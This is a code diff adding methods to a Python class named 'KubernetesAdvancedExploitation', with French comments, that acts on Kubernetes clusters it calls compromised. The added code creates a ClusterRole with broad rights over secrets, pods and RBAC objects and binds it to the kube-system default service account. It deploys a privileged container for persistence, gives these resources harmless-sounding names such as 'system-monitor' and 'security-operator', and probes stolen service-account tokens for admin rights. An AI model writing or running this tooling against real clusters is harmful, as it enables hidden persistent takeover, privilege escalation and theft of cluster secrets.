@@ -1069,6 +1069,121 @@ class KubernetesAdvancedExploitation:
         except Exception as e:
             self.logger.debug(f"❌ Erreur création CRD: {str(e)}")
 
+    async def _modify_rbac_policies(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
+        """Modification des politiques RBAC pour maintenir l'accès"""
+        self.logger.info(f"🔐 Modification des politiques RBAC")
+        
+        # Créer un ClusterRole avec des permissions étendues
+        cluster_role = {
+            "apiVersion": "rbac.authorization.k8s.io/v1",
+            "kind": "ClusterRole",
+            "metadata": {
+                "name": f"system-monitor-{self.session_id[:6]}"
+            },
+            "rules": [
+                {
+                    "apiGroups": [""],
+                    "resources": ["pods", "secrets", "configmaps", "services"],
+                    "verbs": ["get", "list", "create", "update", "patch", "delete"]
+                },
+                {
+                    "apiGroups": ["rbac.authorization.k8s.io"],
+                    "resources": ["clusterroles", "clusterrolebindings"],
+                    "verbs": ["get", "list", "create", "update", "patch"]
+                }
+            ]
+        }
+        
+        try:
+            url = urljoin(base_url, "/apis/rbac.authorization.k8s.io/v1/clusterroles")
+            async with session.post(url, json=cluster_role, timeout=self.config.timeout_per_operation) as response:
+                if response.status in [200, 201]:
+                    self.logger.info(f"✅ ClusterRole malveillant créé")
+                    cluster_info.persistence_mechanisms.append("rbac_modification")
+                    
+                    # Créer un binding pour ce rôle
+                    await self._create_rbac_binding(session, base_url, cluster_info)
+                    
+        except Exception as e:
+            self.logger.debug(f"❌ Erreur modification RBAC: {str(e)}")
+
+    async def _create_rbac_binding(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
+        """Créer un binding RBAC pour maintenir l'accès"""
+        binding = {
+            "apiVersion": "rbac.authorization.k8s.io/v1",
+            "kind": "ClusterRoleBinding",
+            "metadata": {
+                "name": f"system-monitor-binding-{self.session_id[:6]}"
+            },
+            "subjects": [
+                {
+                    "kind": "ServiceAccount",
+                    "name": "default",
+                    "namespace": "kube-system"
+                }
+            ],
+            "roleRef": {
+                "kind": "ClusterRole",
+                "name": f"system-monitor-{self.session_id[:6]}",
+                "apiGroup": "rbac.authorization.k8s.io"
+            }
+        }
+        
+        try:
+            url = urljoin(base_url, "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings")
+            async with session.post(url, json=binding, timeout=self.config.timeout_per_operation) as response:
+                if response.status in [200, 201]:
+                    self.logger.info(f"✅ ClusterRoleBinding créé")
+                    
+        except Exception as e:
+            self.logger.debug(f"❌ Erreur création binding: {str(e)}")
+
+    async def _deploy_malicious_operators(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
+        """Déploiement d'opérateurs malveillants pour persistance"""
+        self.logger.info(f"⚙️ Déploiement d'opérateurs malveillants")
+        
+        # Déploiement d'un operator personnalisé pour persistance
+        operator_deployment = {
+            "apiVersion": "apps/v1",
+            "kind": "Deployment",
+            "metadata": {
+                "name": f"security-operator-{self.session_id[:6]}",
+                "namespace": "kube-system",
+                "labels": {"app": "security-operator"}
+            },
+            "spec": {
+                "replicas": 1,
+                "selector": {"matchLabels": {"app": "security-operator"}},
+                "template": {
+                    "metadata": {"labels": {"app": "security-operator"}},
+                    "spec": {
+                        "serviceAccountName": "default",
+                        "containers": [{
+                            "name": "operator",
+                            "image": "alpine:latest",
+                            "command": ["/bin/sh"],
+                            "args": ["-c", "while true; do sleep 3600; done"],
+                            "securityContext": {"privileged": True},
+                            "env": [
+                                {"name": "CLUSTER_ID", "value": self.session_id},
+                                {"name": "PERSISTENCE_MODE", "value": "operator"}
+                            ]
+                        }]
+                    }
+                }
+            }
+        }
+        
+        try:
+            url = urljoin(base_url, "/apis/apps/v1/namespaces/kube-system/deployments")
+            async with session.post(url, json=operator_deployment, timeout=self.config.timeout_per_operation) as response:
+                if response.status in [200, 201]:
+                    self.logger.info(f"✅ Opérateur malveillant déployé")
+                    cluster_info.persistence_mechanisms.append("malicious_operator")
+                    
+        except Exception as e:
+            self.logger.debug(f"❌ Erreur déploiement opérateur: {str(e)}")
+
     async def _lateral_movement_phase(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
         """Phase de mouvement latéral"""
         self.logger.info(f"🔄 Phase 2: Mouvement latéral - {base_url}")
@@ -1170,6 +1285,72 @@ class KubernetesAdvancedExploitation:
                     
         except Exception as e:
             self.logger.debug(f"❌ Énumération namespaces: {str(e)}")
+
+    async def _test_token_permissions(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
+        """Test des permissions avec les tokens découverts"""
+        try:
+            for token in cluster_info.service_accounts:
+                if not token.token:
+                    continue
+                    
+                headers = {"Authorization": f"Bearer {token.token}"}
+                
+                # Test d'accès aux pods
+                try:
+                    url = urljoin(base_url, "/api/v1/pods")
+                    async with session.get(url, headers=headers, timeout=self.config.timeout_per_operation) as response:
+                        if response.status == 200:
+                            token.permissions.append("pods:list")
+                            self.logger.debug(f"✅ Token {token.name}: accès pods")
+                        elif response.status == 403:
+                            self.logger.debug(f"❌ Token {token.name}: accès pods refusé")
+                except Exception:
+                    pass
+                    
+                # Test d'accès aux secrets
+                try:
+                    url = urljoin(base_url, "/api/v1/secrets")
+                    async with session.get(url, headers=headers, timeout=self.config.timeout_per_operation) as response:
+                        if response.status == 200:
+                            token.permissions.append("secrets:list")
+                            token.is_cluster_admin = True  # Accès aux secrets = admin probable
+                            self.logger.debug(f"✅ Token {token.name}: accès secrets (ADMIN)")
+                        elif response.status == 403:
+                            self.logger.debug(f"❌ Token {token.name}: accès secrets refusé")
+                except Exception:
+                    pass
+                    
+                # Test de création de pods
+                try:
+                    url = urljoin(base_url, "/api/v1/namespaces/default/pods")
+                    test_pod = {
+                        "apiVersion": "v1",
+                        "kind": "Pod",
+                        "metadata": {"name": f"test-{self.session_id[:6]}"},
+                        "spec": {
+                            "containers": [{"name": "test", "image": "alpine:latest", "command": ["sleep", "10"]}]
+                        }
+                    }
+                    async with session.post(url, headers=headers, json=test_pod, timeout=self.config.timeout_per_operation) as response:
+                        if response.status in [200, 201]:
+                            token.permissions.append("pods:create")
+                            token.is_cluster_admin = True
+                            self.logger.debug(f"✅ Token {token.name}: création pods (ADMIN)")
+                            
+                            # Nettoyer le pod de test
+                            delete_url = urljoin(base_url, f"/api/v1/namespaces/default/pods/test-{self.session_id[:6]}")
+                            try:
+                                async with session.delete(delete_url, headers=headers, timeout=5) as del_response:
+                                    pass
+                            except:
+                                pass
+                        elif response.status == 403:
+                            self.logger.debug(f"❌ Token {token.name}: création pods refusée")
+                except Exception:
+                    pass
+                    
+        except Exception as e:
+            self.logger.debug(f"❌ Test permissions tokens: {str(e)}")
 
     def _calculate_vulnerability_score(self, cluster_info: CompromisedCluster):
         """Calcul du score de vulnérabilité"""
